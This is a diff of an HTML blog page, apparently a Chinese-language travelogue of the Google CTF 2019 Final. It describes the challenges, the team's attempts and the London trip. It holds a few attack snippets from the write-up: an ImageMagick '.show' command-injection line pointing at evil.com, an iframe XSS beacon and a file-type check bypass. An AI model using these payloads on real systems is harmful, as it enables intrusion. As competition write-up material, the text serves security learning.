@@ -142,7 +142,7 @@
 <meta property="og:image" content="https://i.imgur.com/odPMuVv.jpg">
 <meta property="og:image" content="https://i.imgur.com/uqoftNP.jpg">
 <meta property="og:image" content="https://i.imgur.com/3t0CQs1.jpg">
-<meta property="og:updated_time" content="2019-11-10T01:32:44.000Z">
+<meta property="og:updated_time" content="2020-02-23T11:53:05.486Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Google CTF 2019 Final 遊記">
 <meta name="twitter:description" content="Google CTF 2019 Final 前言這場是 Google 舉辦的 CTF 決賽，地點在英國倫敦的 Google 大樓內 比賽時間兩天，都是早上9點開始，第一天到晚上8點，第二天到晚上6點半 但其實回飯店後還是能繼續解題，題目都不會關，只有部分題目沒辦法線上解 (p.s. 內文圖多慎入)">
@@ -349,30 +349,37 @@
 <p><img src="https://i.imgur.com/DYKXG5a.jpg" alt=""></p>
 <p><br></p>
 <h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p><img src="https://i.imgur.com/NQQPVI6.jpg" alt=""></p>
-<p>現場跟初賽很大的不同點是，現場賽會有一些特殊的硬體類題目，或是一些必須真人到場才能解的題目，例如開鎖題</p>
+<p>現場跟初賽很大的不同點是，現場賽會有一些特殊的硬體類題目</p>
+<p>或是一些必須真人到場才能解的題目，例如開鎖題</p>
+<p><br></p>
 <p>而題目總共有七種分類：crypto, hardware, misc, sandbox, pwn, reversing, web</p>
-<p>前面講的開鎖題 (Picky blinders) 就被歸類在 Misc 中，這題會讓各隊選偏好的時段，然後時間到就會被抓出去外面開鎖</p>
-<p>這題有三個鎖，第一個鎖應該算練習用的，是那種透明教學用的鎖</p>
+<p>前面講的開鎖題 (Picky blinders) 就被歸類在 Misc 中</p>
+<p>這題會讓各隊選偏好的時段，然後時間到就會被抓出去外面開鎖</p>
+<p>然後這題有三個鎖，第一個鎖應該算練習用的，是那種透明教學用的鎖</p>
 <p>解鎖的方式就是把撞針頂到對的位置，然後用另一根工具(不知道叫啥名字)去轉它就能開了</p>
 <p>第二個鎖是不透明的鎖，就要自己慢慢一個一個踹到對的點</p>
 <p>@sasdf 踹了一波就秒開掉這個鎖了，真不愧是密碼學大佬</p>
 <p>第三個鎖是一個類似保險箱的東西，要用一隻能伸縮，且外型像筆的工具去開他的鎖</p>
 <p>FLAG則是放在這個保險箱中，打開鎖就能拿到flag</p>
-<p>我簡單踹了一波，發現其實還蠻容易抓到感覺的，只要戳到對的點，轉動的手感會不太一樣，慢慢微調就能打開了XD</p>
+<p>我簡單踹了一波，發現其實還蠻容易抓到感覺的</p>
+<p>只要戳到對的點，轉動的手感會不太一樣，慢慢微調就能打開了XD</p>
 <p><img src="https://i.imgur.com/sBgYpdv.jpg" alt=""></p>
 <p><img src="https://i.imgur.com/i54USyB.jpg" alt=""></p>
 <p><img src="https://i.imgur.com/5EwtUrG.jpg" alt=""></p>
 <p>蠻有趣的題目，對沒開過鎖的我來說是個不錯的體驗</p>
 <p>很像那種會在Security Conference上看到的開鎖教學攤位XD</p>
 <p><br></p>
-<p>硬體題有一題類似密室逃脫，是一題拆炸彈題，可以選一位隊員去炸彈房，其他隊員在另一間房，彼此可以用無線電溝通，想辦法拆炸彈</p>
+<p>硬體題有一題類似密室逃脫，是一題拆炸彈題</p>
+<p>可以選一位隊員去炸彈房，其他隊員在另一間房，彼此可以用無線電溝通，想辦法拆炸彈</p>
 <p>在進去之前，我們還不知道是要拆炸彈，不過主辦方有給個小提示:</p>
 <p><img src="https://i.imgur.com/Z7qSRSc.png" alt=""></p>
 <p>所以我們一開始只知道是跟七段顯示器有關的電路題XD</p>
 <p><br></p>
-<p>炸彈會倒數計時，時間到就會爆炸，然後上面有十個撥動開關，和兩條線，以及會影響計時快慢的電容</p>
+<p>炸彈會倒數計時，時間到就會爆炸</p>
+<p>然後上面有十個撥動開關，和兩條線，以及會影響計時快慢的電容</p>
 <p>所以解法其實蠻直觀的，就是把開關撥成正確的密碼，最後剪正確的線就能停止炸彈爆炸</p>
-<p>第一天和第二天分別能進去一次，所以必須想辦法在兩天內拆掉炸彈，不然就拿不到flag了 (但主辦方中間有出包，炸彈一開就爆炸，所以我們總共進了三次)</p>
+<p>第一天和第二天分別能進去一次，所以必須想辦法在兩天內拆掉炸彈，不然就拿不到flag了 </p>
+<p>(但主辦方中間有出包，炸彈一開就爆炸，所以我們總共進了三次)</p>
 <p>炸彈房裡聽說很黑，然後會有一個穿軍裝的人站在旁邊盯著你，讓你感覺壓力很大XD</p>
 <p>然後炸彈房不能帶東西進去，你必須想辦法透過無線電告訴另一間房的隊友，或是超越常人的記憶力把炸彈電路記下來</p>
 <p><br></p>
@@ -381,12 +388,14 @@
 <p>不過最大的難點是，很難透過無線電對話把各個邏輯閘、IC元件線路等資訊帶出來</p>
 <p>所以主辦方還貼心(?)附了一張NATO phonetic alphabet:</p>
 <p><img src="https://i.imgur.com/Eh1tvDD.jpg" alt=""></p>
-<p>但這題最後只有 !SpamAndHex 解掉，根本拆彈專家XD</p>
+<p>但這題最後只有 <code>!SpamAndHex</code> 解掉，根本拆彈專家XD</p>
 <p>其實我們有想到一種能讓電路短路，然後停止時間的方法，但被主辦方禁止使用XD</p>
 <p><br></p>
-<p>Misc 另外有一題 Stuffed，內容是一個網頁，會用 Brotli 編碼去壓縮一堆垃圾，其中包含 flag，所以直接訪問這個網頁，瀏覽器就會把內容解壓縮並顯示出來</p>
-<p>但這題難點在於，這坨垃圾非常大，解壓縮非常吃時間和記憶體，就類似gzip bomb</p>
-<p>google很好心的提供我們免費的gcp帳號，可以任意的開機器</p>
+<p>Misc 另外有一題 Stuffed，內容是一個網頁</p>
+<p>會用 Brotli 編碼去壓縮一堆垃圾，這堆垃圾中間夾了 flag</p>
+<p>所以直接訪問這個網頁，瀏覽器就會把內容解壓縮並顯示出來</p>
+<p>但這題難點在於，這坨垃圾非常大，解壓縮非常吃時間和記憶體，有點類似gzip bomb</p>
+<p>而 google 很好心的提供我們免費的gcp帳號，可以任意的開機器</p>
 <p>所以我們就開了 160 Core + 3.7 TB Memory 的土豪級機器來炸這題:</p>
 <p><img src="https://i.imgur.com/jTnupY1.png" alt=""></p>
 <p>(它的 Memory 比我電腦硬碟還大…)</p>
@@ -398,49 +407,72 @@
 <p><br></p>
 <p>其他領域的題目，有的題類似 Pwn2Own，要把 exploit 塞進隨身碟，然後主辦方會在台上 demo 給大家看，打成功就送你flag</p>
 <p>不過這邊主辦有點小雷，他賽中沒有限制嘗試次數和間隔時間，但我們在解的時候，臨時說一個小時只能踹一次</p>
-<p>然後 Pwn 有一題 Gomium Browser，我們本地成功彈計算機，但上台 exploit 兩次都失敗，剛好就是比賽最後兩個小時，所以就很可惜的沒解掉</p>
+<p>然後 Pwn 有一題 Gomium Browser</p>
+<p>我們本地成功彈計算機，但上台 exploit 兩次都失敗</p>
+<p>剛好就是比賽最後兩個小時，所以就很可惜的沒解掉</p>
 <p>(聽說主辦方在我們失敗之後，關掉螢幕再跑第二次就成功，似乎我們的 Exploit 沒有到非常穩定，所以運氣很差的剛好都失敗)</p>
 <p><br></p>
 <p>Web 的部分，這場共三題 Web，難度應該算是我打過的決賽最高的</p>
-<p>第一天前半場只出了一題 gPhotos2，這題跟初賽的 gPhotos 功能幾乎一樣，你可以傳一張 png, jpg, jpeg 圖片 (會用 imghdr.what 去判)，之後會去 resize 變成縮圖</p>
+<p>第一天前半場只出了一題 <code>gPhotos2</code></p>
+<p>這題跟初賽的 <code>gPhotos</code> 功能幾乎一樣，你可以傳一張 png, jpg, jpeg 圖片 (會用 imghdr.what 去判)，之後會去 resize 轉成縮圖</p>
 <p>(這裡圖片判斷很好繞，只要從第七個字元開始塞<code>JFIF</code>就能繞掉了)</p>
 <p>只是初賽是用 PHP 套 ImageMagick，這題則是 Python django 套 Wand image library</p>
 <p>初賽那題的解法可以參考 Bushwhackers 的 Writeup: <a href="https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/" target="_blank" rel="external">https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/</a></p>
 <p>基本上就是利用 MSL 搭配各種小技巧去 RCE</p>
-<p>但 Python 這題就很難了，因為你沒辦法像php去寫 Webshell，所以一開始我們的方向就變成是找 polyglot 的 payload 去想辦法寫檔蓋掉 import 的 python (搭配 DoS 的洞讓他 Reload library)</p>
-<p>到最後發現，的確成功能用 MSL 去任意寫檔，也成功 Polyglot 造出合法 Python，但寫了後不管怎麼 DoS 它，都沒有成功載入我們的 Python payload</p>
-<p>賽後問了出題人才知道，原來根本沒有資料夾寫入權限… 其實也不太意外，方向偏太多了</p>
-<p>第二天比賽到一半時，主辦方給了一個 Hint: docker image is based on standard debian</p>
+<p>但 Python 這題就很難了，因為你沒辦法像php去寫 Webshell</p>
+<p><br></p>
+<p>所以一開始我們的方向就變成是找 polyglot 的 payload </p>
+<p>去想辦法寫檔蓋掉 import 的 python (搭配 DoS 的洞讓他 Reload library)</p>
+<p>到最後發現，的確成功能用 MSL 去任意寫檔</p>
+<p>也成功 Polyglot 造出合法 Python</p>
+<p>但寫了後不管怎麼 DoS 它，都沒有成功載入我們的 Python payload</p>
+<p>賽後問了出題人才知道，原來根本沒有資料夾寫入權限… </p>
+<p>其實也不太意外，方向偏太多了</p>
+<p><br></p>
+<p>第二天比賽到一半時，這題主辦方有給了一個 Hint: docker image is based on standard debian</p>
 <p>看起來是跟作業系統環境有點關係的利用方式</p>
-<p>到比賽結束，共有兩隊解出來這題，分別是 RedGKFRocket 和 Pasten</p>
-<p>公布解答才知道，原來這題根本是 0day 題，預期解是類似 ImageTragick 要打 <code>.show</code> extension 的 Command Injection</p>
+<p>到比賽結束，共有兩隊解出來這題，分別是 <code>RedGKFRocket</code> 和 <code>Pasten</code></p>
+<p>公布解答才知道，原來這題根本是 0day 題</p>
+<p>預期解是類似 ImageTragick 要打 <code>.show</code> extension 的 Command Injection</p>
 <p>可以在本地踹: <code>$ convert &quot;http://evil.com/some.png?z=&#39;;id;#&#39;&amp;x=123&quot; out.show</code></p>
 <p>不過有隊找到非預期解，是用 ghostscript 去 RCE 的樣子，但也是 0day … ╮(╯_╰)╭</p>
 <p><br></p>
-<p>第二題 Web 是 Saber.ninja，這題還蠻有趣的，是一個音樂遊戲譜面上傳的網站</p>
-<p>一開始會給你一個 Example.bsl，其實就是個 zip 包，裡面包了 <code>Info.dat</code>, <code>Expert.dat</code>,<code>song.ogg</code> 等檔案，紀錄譜面出現時間、歌曲名字、作者名字等資訊</p>
+<p>第二題 Web 是 Saber.ninja</p>
+<p>這題還蠻有趣的，是一個音樂遊戲譜面上傳、預覽的網站</p>
+<p>一開始會給你一個 Example.bsl，其實就是個 zip 包</p>
+<p>裡面包了 <code>Info.dat</code>, <code>Expert.dat</code>,<code>song.ogg</code> 等檔案，紀錄譜面出現時間、歌曲名字、作者名字等資訊</p>
 <p>然後網站可以讓你上傳你自己的 bsl，他會檢查裡面的格式是否符合要求 (這裡要自己黑箱踹)</p>
 <p>若上傳都沒問題，則可以預覽譜面和顯示歌曲名字、作者名字等資訊，還有連結可以直接下載這個 bundle 包跟 beatmap</p>
-<p>另外網站還有一個聊天室可以和你的對手 (admin之類的) 對話，他會要你只能塞 <code>https://saber-ninja.web.ctfcompetition.com/preview/*</code> 的網址，所以很明顯是個 XSS 題</p>
+<p>另外網站還有一個聊天室可以和你的對手 (admin之類的) 對話</p>
+<p>他要求你只能塞 <code>https://saber-ninja.web.ctfcompetition.com/preview/*</code> 的網址，所以很明顯是個 XSS 題</p>
 <p>而我們也很快找到 <code>Info.dat</code> 裡的作者、歌曲等資訊都能塞 HTML Tag</p>
 <p>但這題有討人厭的 CSP: <code>content-security-policy: default-src &#39;self&#39;; frame-src *;</code></p>
-<p>所以很明顯這題要用到 <code>iframe</code> 來 XSS</p>
+<p>所以基本上這題八成要用到 <code>iframe</code> 來 XSS</p>
 <p><br></p>
-<p>OK，我們想說先看一下對面的瀏覽器版本，所以就塞 <code>&lt;iframe src=&quot;\\kaibro.tw&quot;&gt;</code> 之類的 Payload 來讓對面 Bot 送 Request</p>
+<p>OK，我們想說先看一下對面的瀏覽器版本</p>
+<p>所以就塞 <code>&lt;iframe src=&quot;\\kaibro.tw&quot;&gt;</code> 之類的 Payload 來讓對面 Bot 送 Request</p>
 <p>但傳了老半天都沒半個 Request 回來，一度懷疑 Bot 已經爛掉了</p>
-<p>一問出題人，才知道原來送了連結過去，還要先去外面的遊戲房玩過你剛剛送的譜面，過關之後，Bot 才會讀你的連結… WTF</p>
+<p>一問出題人，才知道原來送了連結過去，還要先去外面的遊戲房玩過你剛剛送的譜面</p>
+<p>過關之後，Bot 才會讀你的連結… WTF</p>
+<p><br></p>
 <p>其實玩遊戲這件事蠻有梗的，但是題目完全沒提到有遊戲室這個規則，整個很黑人問號</p>
 <p>如果我們沒問出題人，全場根本不會有人知道要先玩遊戲才能觸發 BOT 訪問= =</p>
-<p>後面還出了一些小問題，例如 BOT 不知為啥只能透過常用 Port 對外連線，應該是 Google 那邊出題環境沒弄好，有點小雷</p>
+<p>後面還出了一些小問題</p>
+<p>例如 BOT 不知為啥只能透過常用 Port 對外連線</p>
+<p>應該是 Google 那邊出題環境沒弄好，有點小雷</p>
 <p><br></p>
-<p>而遊戲部份，是一個 VR 光劍的音樂節奏遊戲 (BeatSaber)，要戴上VR眼鏡，手拿光劍在那邊砍紅色跟藍色的 Notes，中間還會有牆壁之類的障礙物，所以人要跟著左右閃躲XD</p>
-<p>由於我們能夠控制譜面資訊，但是它規定每首歌都至少要有100個 notes，所以我就把譜面最開頭塞了 100 個相同的 notes 疊再一起，只要揮一次劍就能 Full combo XDDD</p>
+<p>而遊戲部份，是一個 VR 光劍的音樂節奏遊戲 (BeatSaber)</p>
+<p>要戴上VR眼鏡，手拿光劍在那邊砍紅色跟藍色的 Notes，中間還會有牆壁之類的障礙物，所以人要跟著左右閃躲XD</p>
+<p>由於我們已經能夠控制譜面資訊，但是它規定每首歌都至少要有100個 notes</p>
+<p>所以我就把譜面最開頭塞了 100 個相同的 notes 疊再一起，只要揮一次劍就能 Full combo XDDD</p>
 <p>玩完遊戲，主辦方就會 enable 題目 bot 對我們送過去連結訪問的權限</p>
 <p>從回來的 Request 可以看到，對方環境是 <code>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3882.0 Safari/537.36</code></p>
 <p><br></p>
 <p>另外我也不小心從主辦方的電腦瞄到幾個關鍵字: <code>UXSS Bot</code>, <code>NaCl</code></p>
-<p>所以猜測這題可能是某種神奇的 Chrome 0/1 Day UXSS，搜尋了一波沒找到類似的洞，就果斷跳題了XD</p>
-<p>中間我們有嘗試透過 Polyglot zip+js 來去做 XSS，但在成功造出 Payload 且本地測試成功時，發現對面環境有設 Content-type nosniff，所以遠端失敗XD</p>
+<p>所以猜測這題可能是某種神奇的 Chrome 0/1 Day UXSS</p>
+<p>搜尋了一波沒找到類似的洞，就果斷跳題了XD</p>
+<p>中間我們有嘗試透過 Polyglot zip+js 來去做 XSS，但在成功造出 Payload 且本地測試成功時</p>
+<p>發現對面環境有設 Content-type nosniff，所以遠端失敗XD</p>
 <p>最後這題到結束，0 隊解，不意外XD</p>
 <p>解法在這: <a href="https://shhnjk.blogspot.com/2019/07/intro-to-chromes-gold-features.html" target="_blank" rel="external">https://shhnjk.blogspot.com/2019/07/intro-to-chromes-gold-features.html</a></p>
 <p><br></p>
@@ -454,7 +486,8 @@
 <p>認真看 Code 會發現不少小問題，但都很難串在一起</p>
 <p>例如:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; ct = &quot;multipart/mixed;boundary=batch_abcdefg;boundary=batch_123456&quot;</div><div class="line">&gt;&gt;&gt; m = _rex.fullmatch(ct)</div><div class="line">&gt;&gt;&gt; m.groups()</div><div class="line">(None, None, &apos;batch_123456&apos;)</div></pre></td></tr></table></figure>
-<p>塞兩個 Boundary，它會取第二個，賽中一直在踹能不能想辦法造成 Proxy 跟後端解析不一致，然後達到類似 Desync 之類的污染效果，但最後失敗惹QQ</p>
+<p>塞兩個 Boundary，它會取第二個</p>
+<p>賽中一直在踹能不能想辦法造成 Proxy 跟後端解析不一致，然後達到類似 Desync 之類的污染效果，但最後失敗惹QQ</p>
 <p>另外還有像是:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/batch?ct=multipart/mixed;aaa=bbb;boundary=batch_w3ier5whgj</div></pre></td></tr></table></figure>
 <p>這樣塞，會導致最後後端回來的 Response Content-type Header 變成部分可控的，<code>aaa=bbb</code>會原封不動的回來</p>
@@ -466,11 +499,18 @@
 <p>賽中我手動看著 RFC 踹了幾個特殊字元，試著玩弄回顯的 Content-type，但都沒成功蓋掉 Content-type</p>
 <p>比賽結束後，出題人才說這題可以用 <code>Content-type: foo,bar</code> 會取成 <code>bar</code> 的特性來蓋</p>
 <p>結果原來我們離正解只差了一點，繼續多踹，運氣好蓋掉Content-type就贏了，算是這場最遺憾的一題 Web XD</p>
-<p>p.s. 這題最後只有 !SpamAndHex 解掉</p>
+<p>p.s. 這題最後只有 <code>!SpamAndHex</code> 解掉</p>
 <p><br></p>
-<p>整體來說，這場題目質量挺高的，也蠻多有趣的題目，食物飲料也各種爽拿爽吃，但還是有一些小地方待改進，例如很多題目環境都講得不清不楚，還有前面提的賽中臨時公告特殊規則等，希望未來可以改善這些小缺點!</p>
+<p>整體來說，這場題目質量挺高的</p>
+<p>也蠻多有趣的題目</p>
+<p>食物飲料也各種爽拿爽吃</p>
+<p>但還是有一些小地方待改進</p>
+<p>例如很多題目環境都講得不清不楚，還有前面提的賽中臨時公告特殊規則等</p>
+<p>希望未來可以改善這些小缺點!</p>
 <p><br></p>
-<h2 id="u884C_u7A0B"><a href="#u884C_u7A0B" class="headerlink" title="行程"></a>行程</h2><p>這次比賽日期主要在 11/2, 11/3 兩天，不過我們 10/30 就到倫敦了，提早跑一些行程，Google 還因此多送我們一晚住宿，聽說一晚價錢要8000台幣，真。佛心公司!</p>
+<h2 id="u884C_u7A0B"><a href="#u884C_u7A0B" class="headerlink" title="行程"></a>行程</h2><p>這次比賽日期主要在 11/2, 11/3 兩天</p>
+<p>不過我們 10/30 就到倫敦了，提早跑一些行程</p>
+<p>Google 還因此多送我們一晚住宿，聽說一晚價錢要8000台幣，真。佛心公司!</p>
 <p>10/31, 11/1, 11/4 這幾天主要就是跑跑倫敦，晃晃一些經典景點之類的地方，然後回去的飛機是 11/4 晚上</p>
 <p>10/31 報名一日旅遊團，跑了溫莎古堡、巨石陣、羅馬浴場等地方</p>
 <p>11/1 則是晃了一些倫敦市區經典景點，包含倫敦塔橋、西敏寺、白金漢宮、倫敦眼等</p>
@@ -484,10 +524,12 @@
 <p>牡蠣卡有分兩種版本：一般版和遊客版</p>
 <p>買的時候都是 35 英鎊，相當於卡片 5 英鎊，裡面帶有 30 英鎊餘額</p>
 <p>一般版可以把卡片退還，會把押金退還之類的，遊客版則是相當於花5英鎊買那張卡做紀念，不用退還</p>
-<p>但其實這個有 BUG，他跟台灣悠遊卡一樣可以刷到金額變負的，我們在最後一天搭車回機場時，最後餘額變-8，所以其實還倒賺3英鎊</p>
+<p>但其實這個有 BUG，他跟台灣悠遊卡一樣可以刷到金額變負的</p>
+<p>我們在最後一天搭車回機場時，最後餘額變-8，所以其實還倒賺3英鎊</p>
 <p><br></p>
 <h2 id="u4F4F_u5BBF"><a href="#u4F4F_u5BBF" class="headerlink" title="住宿"></a>住宿</h2><p><img src="https://i.imgur.com/MZxlyPE.jpg" alt=""></p>
-<p>這次我們的住宿全程都由 Google 包辦，住了一家叫 Pullman 的飯店，地點位在國王十字車站走路3~5分鐘遠的地方，算是還蠻方便的</p>
+<p>這次我們的住宿全程都由 Google 包辦，住了一家叫 Pullman 的飯店</p>
+<p>地點位在國王十字車站走路3~5分鐘遠的地方，算是還蠻方便的</p>
 <p>重點是每天早上在一樓都有很高級的早餐，裡面的食物屌打一堆英國昂貴餐廳的食物</p>
 <p><img src="https://i.imgur.com/GV25iJy.jpg" alt=""></p>
 <p><img src="https://i.imgur.com/cgVlZCo.jpg" alt=""></p>
